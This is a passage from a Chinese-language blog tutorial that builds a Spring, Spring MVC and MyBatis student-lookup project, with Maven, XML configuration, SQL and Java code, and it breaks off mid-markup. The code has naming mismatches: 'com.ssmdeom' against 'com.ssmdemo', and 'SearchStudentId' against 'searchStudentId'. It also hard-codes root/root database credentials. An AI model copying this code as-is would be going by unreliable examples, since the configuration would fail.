&lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-web&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-test&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure></div><p>修改完成后将会自动下载jar包。</p><h3 id="2-3修改web-xml"><a href="#2-3修改web-xml" class="headerlink" title="2.3修改web.xml"></a>2.3修改web.xml</h3><p>配置 DispatcherServlet ，告诉程序去哪里寻找对应的xml文件。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 编码过滤器 --&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;encoding&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;UTF-8&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置DispatcherServlet --&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;!-- 配置springMVC需要加载的配置文件--&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;classpath:spring-*.xml&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">        &lt;async-supported&gt;true&lt;/async-supported&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">        &lt;!-- 匹配所有请求 --&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="2-4创建jdbc-properties"><a href="#2-4创建jdbc-properties" class="headerlink" title="2.4创建jdbc.properties"></a>2.4创建jdbc.properties</h3><p> 在resources目录下创建jdbc.properties</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">#数据库地址</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;characterEncoding=utf8</span><br><span class="line">#用户名</span><br><span class="line">jdbc.username=root</span><br><span class="line">#密码</span><br><span class="line">jdbc.password=root</span><br><span class="line">#最大连接数</span><br><span class="line">c3p0.maxPoolSize=30</span><br><span class="line">#最小连接数</span><br><span class="line">c3p0.minPoolSize=10</span><br><span class="line">#关闭连接后不自动commit</span><br><span class="line">c3p0.autoCommitOnClose=false</span><br><span class="line">#获取连接超时时间</span><br><span class="line">c3p0.checkoutTimeout=10000</span><br><span class="line">#当获取连接失败重试次数</span><br><span class="line">c3p0.acquireRetryAttempts=2</span><br></pre></td></tr></table></figure></div><h3 id="2-5创建spring-mybatis-xml"><a href="#2-5创建spring-mybatis-xml" class="headerlink" title="2.5创建spring-mybatis.xml"></a>2.5创建spring-mybatis.xml</h3><p> 在resource目录下创建spring-mybatis.xml</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 扫描service包下所有使用注解的类型 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.ssmdeom.service&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置数据库相关参数properties的属性：$&#123;url&#125; --&gt;</span><br><span class="line">    &lt;context:property-placeholder location=&quot;classpath:jdbc.properties&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 数据库连接池 --&gt;</span><br><span class="line">    &lt;bean id=&quot;dataSource&quot; class=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;driverClass&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;jdbcUrl&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;user&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;maxPoolSize&quot; value=&quot;$&#123;c3p0.maxPoolSize&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;minPoolSize&quot; value=&quot;$&#123;c3p0.minPoolSize&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;autoCommitOnClose&quot; value=&quot;$&#123;c3p0.autoCommitOnClose&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;checkoutTimeout&quot; value=&quot;$&#123;c3p0.checkoutTimeout&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;acquireRetryAttempts&quot; value=&quot;$&#123;c3p0.acquireRetryAttempts&#125;&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置SqlSessionFactory对象 --&gt;</span><br><span class="line">    &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;</span><br><span class="line">        &lt;!-- 注入数据库连接池 --&gt;</span><br><span class="line">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;</span><br><span class="line">        &lt;!-- 扫描entity包 使用别名 --&gt;</span><br><span class="line">        &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.ssmdemo.entity&quot;/&gt;</span><br><span class="line">        &lt;!-- 扫描sql配置文件:mapper需要的xml文件 --&gt;</span><br><span class="line">        &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置扫描Dao接口包，动态实现Dao接口，注入到spring容器中 --&gt;</span><br><span class="line">    &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt;</span><br><span class="line">        &lt;!-- 注入sqlSessionFactory --&gt;</span><br><span class="line">        &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt;</span><br><span class="line">        &lt;!-- 给出需要扫描Dao接口包 --&gt;</span><br><span class="line">        &lt;property name=&quot;basePackage&quot; value=&quot;com.ssmdeom.dao&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置事务管理器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;</span><br><span class="line">        &lt;!-- 注入数据库连接池 --&gt;</span><br><span class="line">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置基于注解的声明式事务 --&gt;</span><br><span class="line">    &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div><h3 id="2-6创建spring-mvc-xml"><a href="#2-6创建spring-mvc-xml" class="headerlink" title="2.6创建spring-mvc.xml"></a>2.6创建spring-mvc.xml</h3><p> 在resource目录下创建spring-mvc.xml</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">       http://www.springframework.org/schema/mvc</span><br><span class="line">       http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 扫描web相关的bean --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.ssmdeom.controller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 开启SpringMVC注解模式 --&gt;</span><br><span class="line">    &lt;mvc:annotation-driven/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 静态资源默认servlet配置 --&gt;</span><br><span class="line">    &lt;mvc:default-servlet-handler/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 配置jsp 显示ViewResolver --&gt;</span><br><span class="line">    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div><h3 id="2-7配置日志相关文件"><a href="#2-7配置日志相关文件" class="headerlink" title="2.7配置日志相关文件"></a>2.7配置日志相关文件</h3><p>在resource目录下创建logback.xml</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration debug=&quot;true&quot;&gt;</span><br><span class="line">    &lt;appender name=&quot;STDOUT&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">    &lt;root level=&quot;debug&quot;&gt;</span><br><span class="line">        &lt;appender-ref ref=&quot;STDOUT&quot;/&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></div><h2 id="3-创建数据库"><a href="#3-创建数据库" class="headerlink" title="3.创建数据库"></a>3.创建数据库</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `student` (</span><br><span class="line">  `ID` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `stuName` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_nopad_ci DEFAULT NULL,</span><br><span class="line">  `stuAge` tinyint(4) DEFAULT NULL,</span><br><span class="line">  `mobile` varchar(11) CHARACTER SET latin1 DEFAULT NULL,</span><br><span class="line">  `address` varchar(256) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,</span><br><span class="line">  `EntranceTime` date DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`ID`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci</span><br></pre></td></tr></table></figure></div><h2 id="4-编写程序"><a href="#4-编写程序" class="headerlink" title="4.编写程序"></a>4.编写程序</h2><h3 id="4-1在entity下创建Student实体"><a href="#4-1在entity下创建Student实体" class="headerlink" title="4.1在entity下创建Student实体"></a>4.1在entity下创建Student实体</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package com.ssmdeom.entity;</span><br><span class="line"></span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class Student &#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String stuName;</span><br><span class="line">    private int stuAge;</span><br><span class="line">    private String mobile;</span><br><span class="line">    private String address;</span><br><span class="line">    private Date EntranceTime;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getStuName() &#123;</span><br><span class="line">        return stuName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setStuName(String stuName) &#123;</span><br><span class="line">        this.stuName = stuName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getStuAge() &#123;</span><br><span class="line">        return stuAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setStuAge(int stuAge) &#123;</span><br><span class="line">        this.stuAge = stuAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getMobile() &#123;</span><br><span class="line">        return mobile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setMobile(String mobile) &#123;</span><br><span class="line">        this.mobile = mobile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getAddress() &#123;</span><br><span class="line">        return address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAddress(String address) &#123;</span><br><span class="line">        this.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Date getEntranceTime() &#123;</span><br><span class="line">        return EntranceTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setEntranceTime(Date entranceTime) &#123;</span><br><span class="line">        EntranceTime = entranceTime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-2在Dao下面创建Dao接口"><a href="#4-2在Dao下面创建Dao接口" class="headerlink" title="4.2在Dao下面创建Dao接口"></a>4.2在Dao下面创建Dao接口</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package com.ssmdeom.dao;</span><br><span class="line"></span><br><span class="line">import com.ssmdeom.entity.Student;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public interface StudentDao &#123;</span><br><span class="line"></span><br><span class="line">    Student SearchStudentId(int id);</span><br><span class="line">    List&lt;Student&gt; listStudent();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-3在resources-mapper下编写StudentDao-xml映射文件"><a href="#4-3在resources-mapper下编写StudentDao-xml映射文件" class="headerlink" title="4.3在resources/mapper下编写StudentDao.xml映射文件"></a>4.3在resources/mapper下编写StudentDao.xml映射文件</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 设置为IUserDao接口方法提供sql语句配置 --&gt;</span><br><span class="line">&lt;mapper namespace=&quot;com.ssmdeom.dao.StudentDao&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select id=&quot;searchStudentId&quot; resultMap=&quot;student&quot; parameterType=&quot;int&quot;&gt;</span><br><span class="line">        SELECT * FROM student WHERE id = #&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line"></span><br><span class="line">    &lt;resultMap id=&quot;student&quot; type=&quot;student&quot;&gt;</span><br><span class="line">        &lt;id column=&quot;id&quot; property=&quot;id&quot; /&gt;</span><br><span class="line">        &lt;result column=&quot;stuName&quot; property=&quot;stuName&quot; /&gt;</span><br><span class="line">        &lt;result column=&quot;stuAge&quot; property=&quot;stuAge&quot; /&gt;</span><br><span class="line">        &lt;result column=&quot;mobile&quot; property=&quot;mobile&quot; /&gt;</span><br><span class="line">        &lt;result column=&quot;address&quot; property=&quot;address&quot; /&gt;</span><br><span class="line">        &lt;result column=&quot;EntranceTime&quot; property=&quot;EntranceTime&quot; /&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select id=&quot;listStudent&quot; resultMap=&quot;student&quot;&gt;</span><br><span class="line">        SELECT * FROM student</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure></div><h3 id="4-4在service下创建StudentService的接口"><a href="#4-4在service下创建StudentService的接口" class="headerlink" title="4.4在service下创建StudentService的接口"></a>4.4在service下创建StudentService的接口</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.ssmdeom.service;</span><br><span class="line"></span><br><span class="line">import com.ssmdeom.entity.Student;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public interface StudentService &#123;</span><br><span class="line"></span><br><span class="line">    Student searchStudentId(int id);</span><br><span class="line">    List&lt;Student&gt; listStudent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-5在service下创建StudentServiceImpl类"><a href="#4-5在service下创建StudentServiceImpl类" class="headerlink" title="4.5在service下创建StudentServiceImpl类"></a>4.5在service下创建StudentServiceImpl类</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight 